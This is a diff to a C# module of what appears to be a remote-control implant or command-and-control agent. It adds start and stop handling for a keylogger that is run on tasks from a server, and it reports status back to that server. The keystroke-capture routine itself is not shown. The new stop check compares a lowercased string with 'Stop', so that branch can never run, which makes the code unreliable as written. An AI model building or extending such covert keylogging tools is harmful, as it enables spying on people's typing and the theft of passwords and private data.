@@ -1,8 +1,10 @@
 ﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.Json;
 using Agent.Interfaces;
 using Agent.Models;
+using Agent.Utilities;
 
 namespace Agent
 {
@@ -21,16 +23,32 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
 
-            if (this.isRunning)
+            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
+            if (args["action"].ToLower() == "Stop")
             {
-                await messageManager.WriteLine("Task to stop.", job.task.id, true);
-                cts.Cancel();
-                this.isRunning = false;
+                if (this.isRunning)
+                {
+                    cts.Cancel();
+                    this.isRunning = false;
+                    await messageManager.WriteLine("Tasked to stop.", job.task.id, true);
+                }
+                else
+                {
+                    await messageManager.WriteLine("Task is not running.", job.task.id, true);
+                }
             }
             else
             {
-                cts = new CancellationTokenSource();
-                StartKeylogger(job.task.id);
+                if(!this.isRunning)
+                {
+                    cts = new CancellationTokenSource();
+                    StartKeylogger(job.task.id);
+                    await messageManager.WriteLine("Keylogger started.", job.task.id, true);
+                }
+                else
+                {
+                    await messageManager.WriteLine("Already running", job.task.id, true);
+                }
             }
         }
         public bool StartKeylogger(string task_id)
